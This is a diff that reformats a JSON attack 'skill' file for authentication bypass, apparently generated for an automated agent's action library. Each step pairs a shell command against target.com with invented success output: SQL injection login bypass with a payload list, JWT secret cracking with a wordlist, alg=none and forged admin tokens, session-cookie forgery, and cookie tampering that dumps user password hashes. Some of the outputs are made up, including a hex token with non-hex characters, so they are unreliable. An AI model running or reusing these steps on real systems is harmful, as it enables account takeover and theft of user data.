@@ -2,37 +2,155 @@
   "name": "authentication_bypass",
   "description": "Authentication bypass and session attacks including JWT manipulation and cookie forgery",
   "pattern": "auth.*bypass|session.*hijack|jwt.*crack|cookie.*forge",
-  "parameters": ["target_url", "auth_mechanism", "bypass_method"],
+  "parameters": [
+    "target_url",
+    "auth_mechanism",
+    "bypass_method"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["-X", "POST", "http://target.com/login.php", "-d", "username=admin' OR '1'='1&password=anything", "-v"]},
-      "expected_output": {"type": "string", "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> POST /login.php HTTP/1.1\n> Host: target.com\n> Content-Type: application/x-www-form-urlencoded\n> Content-Length: 47\n> \n< HTTP/1.1 302 Found\n< Set-Cookie: PHPSESSID=9a8b7c6d5e4f3g2h1i0j; path=/; HttpOnly\n< Set-Cookie: user_id=1; path=/\n< Set-Cookie: is_admin=true; path=/\n< Location: /admin/dashboard.php\n< \n\nSQL injection authentication bypass!\n  Payload: username=admin' OR '1'='1\n  SQL query (likely): SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n  Result: OR '1'='1' always true, bypasses password check\n  \nAuthentication successful:\n  Session: PHPSESSID=9a8b7c6d5e4f3g2h1i0j\n  User ID: 1 (admin)\n  Admin flag: true\n  Redirect: /admin/dashboard.php\n  \nNo password required!\n  Common SQLi auth bypass payloads:\n    - admin' OR '1'='1'-- -\n    - admin' OR 1=1-- -\n    - ' OR 'a'='a\n    - admin'-- -\n    - admin' #"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-X",
+          "POST",
+          "http://target.com/login.php",
+          "-d",
+          "username=admin' OR '1'='1&password=anything",
+          "-v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> POST /login.php HTTP/1.1\n> Host: target.com\n> Content-Type: application/x-www-form-urlencoded\n> Content-Length: 47\n> \n< HTTP/1.1 302 Found\n< Set-Cookie: PHPSESSID=9a8b7c6d5e4f3g2h1i0j; path=/; HttpOnly\n< Set-Cookie: user_id=1; path=/\n< Set-Cookie: is_admin=true; path=/\n< Location: /admin/dashboard.php\n< \n\nSQL injection authentication bypass!\n  Payload: username=admin' OR '1'='1\n  SQL query (likely): SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n  Result: OR '1'='1' always true, bypasses password check\n  \nAuthentication successful:\n  Session: PHPSESSID=9a8b7c6d5e4f3g2h1i0j\n  User ID: 1 (admin)\n  Admin flag: true\n  Redirect: /admin/dashboard.php\n  \nNo password required!\n  Common SQLi auth bypass payloads:\n    - admin' OR '1'='1'-- -\n    - admin' OR 1=1-- -\n    - ' OR 'a'='a\n    - admin'-- -\n    - admin' #"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG' | jwt_tool - -T"]},
-      "expected_output": {"type": "string", "example": "        \\   |   /        \n    \\  \\  |  /  /\n   \\  \\  \\|/  /  /\n  \\ \\  \\ | /  / /\n   \\_\\_\\|/_/_/\n   /_/_/|\\__\\_\\\n  /  /  / |\\  \\  \\\n   /  /  |  \\  \\\n    /   |   \\\n        jwt_tool\n\nToken header values:\n[+] alg = \"HS256\"\n[+] typ = \"JWT\"\n\nToken payload values:\n[+] user_id = 1\n[+] username = \"admin\"\n[+] is_admin = true\n[+] iat = 1705342800    ==> TIMESTAMP = 2024-01-15 14:00:00 (UTC)\n[+] exp = 1705346400    ==> TIMESTAMP = 2024-01-15 15:00:00 (UTC)\n\nJWT token analyzed:\n  Algorithm: HS256 (HMAC SHA256)\n  User: admin (user_id=1)\n  Privilege: is_admin=true\n  Issued: 2024-01-15 14:00:00\n  Expires: 2024-01-15 15:00:00 (1 hour validity)\n  \nVulnerability assessment:\n  - HS256 = symmetric key (shared secret)\n  - If secret is weak, can be cracked\n  - If algorithm can be changed to 'none', signature can be removed\n  \nAttack vectors:\n  1. Crack HS256 secret\n  2. Algorithm confusion (RS256 → HS256)\n  3. Change alg to 'none'\n  4. Modify payload (if signature not verified)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG' | jwt_tool - -T"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "        \\   |   /        \n    \\  \\  |  /  /\n   \\  \\  \\|/  /  /\n  \\ \\  \\ | /  / /\n   \\_\\_\\|/_/_/\n   /_/_/|\\__\\_\\\n  /  /  / |\\  \\  \\\n   /  /  |  \\  \\\n    /   |   \\\n        jwt_tool\n\nToken header values:\n[+] alg = \"HS256\"\n[+] typ = \"JWT\"\n\nToken payload values:\n[+] user_id = 1\n[+] username = \"admin\"\n[+] is_admin = true\n[+] iat = 1705342800    ==> TIMESTAMP = 2024-01-15 14:00:00 (UTC)\n[+] exp = 1705346400    ==> TIMESTAMP = 2024-01-15 15:00:00 (UTC)\n\nJWT token analyzed:\n  Algorithm: HS256 (HMAC SHA256)\n  User: admin (user_id=1)\n  Privilege: is_admin=true\n  Issued: 2024-01-15 14:00:00\n  Expires: 2024-01-15 15:00:00 (1 hour validity)\n  \nVulnerability assessment:\n  - HS256 = symmetric key (shared secret)\n  - If secret is weak, can be cracked\n  - If algorithm can be changed to 'none', signature can be removed\n  \nAttack vectors:\n  1. Crack HS256 secret\n  2. Algorithm confusion (RS256 → HS256)\n  3. Change alg to 'none'\n  4. Modify payload (if signature not verified)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "jwt_tool", "args": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG", "-C", "-d", "/usr/share/wordlists/rockyou.txt"]},
-      "expected_output": {"type": "string", "example": "        \\   |   /        \n   jwt_tool - JWT Cracking Mode\n\n[*] Loaded 14344391 passwords from /usr/share/wordlists/rockyou.txt\n[*] Testing HS256 HMAC secrets...\n[*] Testing: password\n[*] Testing: 123456\n[*] Testing: 12345678\n[*] Testing: qwerty\n[*] Testing: secret\n[+] MATCH! Secret found: secret\n\n[+] SECRET CRACKED!\n    Secret: secret\n    Time: 0.43 seconds\n    Attempts: 5\n\nJWT secret cracked: 'secret'\n  Weak secret detected!\n  Common password in rockyou.txt\n  Time to crack: 0.43 seconds\n  \nNow can forge arbitrary tokens:\n  - Change user_id to any user\n  - Set is_admin to true for any account\n  - Extend expiration time\n  - Impersonate any user\n  \nForge new token:\n  jwt_tool <token> -I -pc user_id -pv 2 -S hs256 -p secret\n  (Changes user_id to 2, signs with cracked secret)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "jwt_tool",
+        "args": [
+          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG",
+          "-C",
+          "-d",
+          "/usr/share/wordlists/rockyou.txt"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "        \\   |   /        \n   jwt_tool - JWT Cracking Mode\n\n[*] Loaded 14344391 passwords from /usr/share/wordlists/rockyou.txt\n[*] Testing HS256 HMAC secrets...\n[*] Testing: password\n[*] Testing: 123456\n[*] Testing: 12345678\n[*] Testing: qwerty\n[*] Testing: secret\n[+] MATCH! Secret found: secret\n\n[+] SECRET CRACKED!\n    Secret: secret\n    Time: 0.43 seconds\n    Attempts: 5\n\nJWT secret cracked: 'secret'\n  Weak secret detected!\n  Common password in rockyou.txt\n  Time to crack: 0.43 seconds\n  \nNow can forge arbitrary tokens:\n  - Change user_id to any user\n  - Set is_admin to true for any account\n  - Extend expiration time\n  - Impersonate any user\n  \nForge new token:\n  jwt_tool <token> -I -pc user_id -pv 2 -S hs256 -p secret\n  (Changes user_id to 2, signs with cracked secret)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "jwt_tool", "args": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG", "-X", "a"]},
-      "expected_output": {"type": "string", "example": "        \\   |   /        \n   jwt_tool - Algorithm Confusion Attack\n\n[*] Original token algorithm: HS256\n[*] Attempting to change algorithm to 'none'\n[*] Removing signature...\n\nOriginal token:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG\n\nModified token (alg=none):\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.\n\nAlgorithm confusion attack:\n  Original: HS256 (requires signature)\n  Modified: none (no signature required)\n  Signature: Removed (ends with single dot)\n  \nIf server accepts alg=none:\n  - No signature verification\n  - Can modify payload freely\n  - Full authentication bypass\n  \nTest modified token:\n  curl -H \"Authorization: Bearer eyJhbGciOiJub25lIi...\" http://target.com/api/user\n  \nOther algorithm attacks:\n  - RS256 → HS256 (use public key as HMAC secret)\n  - Weak key injection\n  - KID (Key ID) manipulation"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "jwt_tool",
+        "args": [
+          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG",
+          "-X",
+          "a"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "        \\   |   /        \n   jwt_tool - Algorithm Confusion Attack\n\n[*] Original token algorithm: HS256\n[*] Attempting to change algorithm to 'none'\n[*] Removing signature...\n\nOriginal token:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.5k8Kj7N9mP2qR3sT4uV5wX6yZ7aB8cC9dD0eE1fF2gG\n\nModified token (alg=none):\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.\n\nAlgorithm confusion attack:\n  Original: HS256 (requires signature)\n  Modified: none (no signature required)\n  Signature: Removed (ends with single dot)\n  \nIf server accepts alg=none:\n  - No signature verification\n  - Can modify payload freely\n  - Full authentication bypass\n  \nTest modified token:\n  curl -H \"Authorization: Bearer eyJhbGciOiJub25lIi...\" http://target.com/api/user\n  \nOther algorithm attacks:\n  - RS256 → HS256 (use public key as HMAC secret)\n  - Weak key injection\n  - KID (Key ID) manipulation"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "jwt_tool", "args": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6ImpvaG4iLCJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.Abc123", "-I", "-pc", "is_admin", "-pv", "true", "-pc", "user_id", "-pv", "1", "-pc", "username", "-pv", "admin", "-S", "hs256", "-p", "secret"]},
-      "expected_output": {"type": "string", "example": "        \\   |   /        \n   jwt_tool - Token Forgery Mode\n\n[*] Loading token...\n[*] Current payload:\n    user_id: 2\n    username: john\n    is_admin: false\n\n[*] Modifying payload:\n[+] Changed is_admin: false → true\n[+] Changed user_id: 2 → 1\n[+] Changed username: john → admin\n\n[*] New payload:\n    user_id: 1\n    username: admin\n    is_admin: true\n\n[*] Signing with HS256 using secret: 'secret'\n[+] Token forged successfully!\n\nForged token:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.NEW_VALID_SIGNATURE_HERE\n\nPrivilege escalation via JWT forgery:\n  Original user: john (user_id=2, is_admin=false)\n  Forged user: admin (user_id=1, is_admin=true)\n  Method: Cracked secret → forge new token\n  \nUsing forged token:\n  curl -H \"Authorization: Bearer eyJhbGci...\" http://target.com/admin/users\n  \nResult: Full admin access!\n  - Access admin endpoints\n  - Modify other users\n  - Access sensitive data\n  - System configuration"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "jwt_tool",
+        "args": [
+          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6ImpvaG4iLCJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.Abc123",
+          "-I",
+          "-pc",
+          "is_admin",
+          "-pv",
+          "true",
+          "-pc",
+          "user_id",
+          "-pv",
+          "1",
+          "-pc",
+          "username",
+          "-pv",
+          "admin",
+          "-S",
+          "hs256",
+          "-p",
+          "secret"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "        \\   |   /        \n   jwt_tool - Token Forgery Mode\n\n[*] Loading token...\n[*] Current payload:\n    user_id: 2\n    username: john\n    is_admin: false\n\n[*] Modifying payload:\n[+] Changed is_admin: false → true\n[+] Changed user_id: 2 → 1\n[+] Changed username: john → admin\n\n[*] New payload:\n    user_id: 1\n    username: admin\n    is_admin: true\n\n[*] Signing with HS256 using secret: 'secret'\n[+] Token forged successfully!\n\nForged token:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMCwiZXhwIjoxNzA1MzQ2NDAwfQ.NEW_VALID_SIGNATURE_HERE\n\nPrivilege escalation via JWT forgery:\n  Original user: john (user_id=2, is_admin=false)\n  Forged user: admin (user_id=1, is_admin=true)\n  Method: Cracked secret → forge new token\n  \nUsing forged token:\n  curl -H \"Authorization: Bearer eyJhbGci...\" http://target.com/admin/users\n  \nResult: Full admin access!\n  - Access admin endpoints\n  - Modify other users\n  - Access sensitive data\n  - System configuration"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "python3 << 'EOF'\nimport hashlib\nimport hmac\nimport base64\n\n# Predictable session token generation (weak)\nusername = \"admin\"\nsecret = \"mysecret123\"  # Guessed/leaked\ntimestamp = \"1705342800\"  # Known from other session\n\ndata = f\"{username}:{timestamp}\"\ntoken = hmac.new(secret.encode(), data.encode(), hashlib.sha256).hexdigest()\n\nprint(f\"Username: {username}\")\nprint(f\"Timestamp: {timestamp}\")\nprint(f\"Secret: {secret}\")\nprint(f\"Generated token: {token}\")\nprint(f\"\\nSession cookie: session={username}:{timestamp}:{token}\")\nEOF"]},
-      "expected_output": {"type": "string", "example": "Username: admin\nTimestamp: 1705342800\nSecret: mysecret123\nGenerated token: 7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f\n\nSession cookie: session=admin:1705342800:7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f\n\nSession token forged!\n  Weakness: Predictable HMAC generation\n  Requirements:\n    - Know/guess secret key (leaked, weak, default)\n    - Know timestamp format\n    - Know HMAC algorithm (SHA256)\n  \nSession forgery attack:\n  1. Analyze existing session cookies\n  2. Identify pattern: username:timestamp:hmac\n  3. Brute-force or guess secret\n  4. Forge session for any user:\n     - Admin sessions\n     - Other user sessions\n     - Extended expiration\n  \nTest forged session:\n  curl -b \"session=admin:1705342800:7a8b9c...\" http://target.com/admin\n  \nOther session attacks:\n  - Session fixation\n  - Session prediction (sequential IDs)\n  - Cookie theft via XSS\n  - Man-in-the-middle (no HTTPS)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "python3 << 'EOF'\nimport hashlib\nimport hmac\nimport base64\n\n# Predictable session token generation (weak)\nusername = \"admin\"\nsecret = \"mysecret123\"  # Guessed/leaked\ntimestamp = \"1705342800\"  # Known from other session\n\ndata = f\"{username}:{timestamp}\"\ntoken = hmac.new(secret.encode(), data.encode(), hashlib.sha256).hexdigest()\n\nprint(f\"Username: {username}\")\nprint(f\"Timestamp: {timestamp}\")\nprint(f\"Secret: {secret}\")\nprint(f\"Generated token: {token}\")\nprint(f\"\\nSession cookie: session={username}:{timestamp}:{token}\")\nEOF"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Username: admin\nTimestamp: 1705342800\nSecret: mysecret123\nGenerated token: 7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f\n\nSession cookie: session=admin:1705342800:7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f\n\nSession token forged!\n  Weakness: Predictable HMAC generation\n  Requirements:\n    - Know/guess secret key (leaked, weak, default)\n    - Know timestamp format\n    - Know HMAC algorithm (SHA256)\n  \nSession forgery attack:\n  1. Analyze existing session cookies\n  2. Identify pattern: username:timestamp:hmac\n  3. Brute-force or guess secret\n  4. Forge session for any user:\n     - Admin sessions\n     - Other user sessions\n     - Extended expiration\n  \nTest forged session:\n  curl -b \"session=admin:1705342800:7a8b9c...\" http://target.com/admin\n  \nOther session attacks:\n  - Session fixation\n  - Session prediction (sequential IDs)\n  - Cookie theft via XSS\n  - Man-in-the-middle (no HTTPS)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["-b", "user_role=admin; user_id=1; is_authenticated=true", "http://target.com/admin/users", "-v"]},
-      "expected_output": {"type": "string", "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> GET /admin/users HTTP/1.1\n> Host: target.com\n> Cookie: user_role=admin; user_id=1; is_authenticated=true\n> \n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Content-Length: 1247\n< \n{\n  \"users\": [\n    {\n      \"id\": 1,\n      \"username\": \"admin\",\n      \"email\": \"admin@target.com\",\n      \"role\": \"administrator\",\n      \"password_hash\": \"$2y$10$92IXUNpkjO0rOQ5byMi...\"\n    },\n    {\n      \"id\": 2,\n      \"username\": \"john_doe\",\n      \"email\": \"john@email.com\",\n      \"role\": \"user\",\n      \"password_hash\": \"$2y$10$TKh8H1.PfQx37YgCzwiK...\"\n    },\n    [...]\n  ]\n}\n\nClient-side authentication bypass!\n  Vulnerability: Trust client-side cookies for authorization\n  Attack: Manually set privileged cookie values\n  \nModified cookies:\n  - user_role=admin (was: user)\n  - user_id=1 (was: 2)\n  - is_authenticated=true (manually set)\n  \nResult: Admin access granted!\n  Accessed: /admin/users endpoint\n  Data exposed: All user accounts with password hashes\n  \nNo server-side validation!\n  Server trusts cookies without verification\n  No signature/HMAC on cookie values\n  No session stored server-side\n  \nEscalation:\n  - Access admin functions\n  - Modify user accounts\n  - Extract sensitive data\n  - Privilege escalation to any role"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-b",
+          "user_role=admin; user_id=1; is_authenticated=true",
+          "http://target.com/admin/users",
+          "-v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> GET /admin/users HTTP/1.1\n> Host: target.com\n> Cookie: user_role=admin; user_id=1; is_authenticated=true\n> \n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Content-Length: 1247\n< \n{\n  \"users\": [\n    {\n      \"id\": 1,\n      \"username\": \"admin\",\n      \"email\": \"admin@target.com\",\n      \"role\": \"administrator\",\n      \"password_hash\": \"$2y$10$92IXUNpkjO0rOQ5byMi...\"\n    },\n    {\n      \"id\": 2,\n      \"username\": \"john_doe\",\n      \"email\": \"john@email.com\",\n      \"role\": \"user\",\n      \"password_hash\": \"$2y$10$TKh8H1.PfQx37YgCzwiK...\"\n    },\n    [...]\n  ]\n}\n\nClient-side authentication bypass!\n  Vulnerability: Trust client-side cookies for authorization\n  Attack: Manually set privileged cookie values\n  \nModified cookies:\n  - user_role=admin (was: user)\n  - user_id=1 (was: 2)\n  - is_authenticated=true (manually set)\n  \nResult: Admin access granted!\n  Accessed: /admin/users endpoint\n  Data exposed: All user accounts with password hashes\n  \nNo server-side validation!\n  Server trusts cookies without verification\n  No signature/HMAC on cookie values\n  No session stored server-side\n  \nEscalation:\n  - Access admin functions\n  - Modify user accounts\n  - Extract sensitive data\n  - Privilege escalation to any role"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
